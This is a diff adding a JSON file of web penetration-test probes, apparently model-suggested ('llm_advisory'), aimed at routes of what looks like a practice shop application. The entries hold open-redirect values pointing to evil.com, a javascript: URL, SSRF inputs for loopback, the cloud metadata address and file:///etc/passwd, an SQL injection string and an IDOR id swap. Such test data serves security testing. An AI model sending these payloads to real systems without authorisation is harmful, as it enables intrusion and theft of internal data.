@@ -1,0 +1,102 @@
+[
+  {
+    "confidence": 0.0,
+    "family": "OPEN_REDIRECT",
+    "parameter": "to",
+    "payload_id": "redirect_absolute",
+    "payload_value": "https://evil.com",
+    "rationale_digest": "438e76614c1a43d6",
+    "route": "/redirect?to=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "OPEN_REDIRECT",
+    "parameter": "to",
+    "payload_id": "redirect_protocol_relative",
+    "payload_value": "//evil.com",
+    "rationale_digest": "e8178dd790e2c171",
+    "route": "/redirect?to=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "OPEN_REDIRECT",
+    "parameter": "to",
+    "payload_id": "redirect_javascript",
+    "payload_value": "javascript:alert(1)",
+    "rationale_digest": "b79ff346d95b8587",
+    "route": "/redirect?to=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "SSRF",
+    "parameter": "to",
+    "payload_id": "ssrf_loopback",
+    "payload_value": "http://127.0.0.1",
+    "rationale_digest": "af8c3bcc24b47cb8",
+    "route": "/redirect?to=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "SSRF",
+    "parameter": "to",
+    "payload_id": "ssrf_metadata",
+    "payload_value": "http://169.254.169.254",
+    "rationale_digest": "39bc4f7476a40a12",
+    "route": "/redirect?to=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "SSRF",
+    "parameter": "to",
+    "payload_id": "ssrf_file_scheme",
+    "payload_value": "file:///etc/passwd",
+    "rationale_digest": "e76866b56fc7f6c7",
+    "route": "/redirect?to=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "IDOR",
+    "parameter": "path_segment_3",
+    "payload_id": "idor_next_id",
+    "payload_value": "2",
+    "rationale_digest": "f1c7cb8bfbc97a24",
+    "route": "/rest/basket/1",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "XSS",
+    "parameter": "q",
+    "payload_id": "xss_script_marker",
+    "payload_value": "webpent_xss_probe_7f1",
+    "rationale_digest": "d7886f2c24810424",
+    "route": "/rest/products/search?q=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "SQLI",
+    "parameter": "q",
+    "payload_id": "sqli_boolean_or",
+    "payload_value": "' OR 1=1--",
+    "rationale_digest": "859d895441fccae6",
+    "route": "/rest/products/search?q=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "XSS",
+    "parameter": "q",
+    "payload_id": "xss_script_marker",
+    "payload_value": "webpent_xss_probe_7f1",
+    "rationale_digest": "727295113248a8a2",
+    "route": "/search?q=",
+    "source": "llm_advisory"
+  }
+]
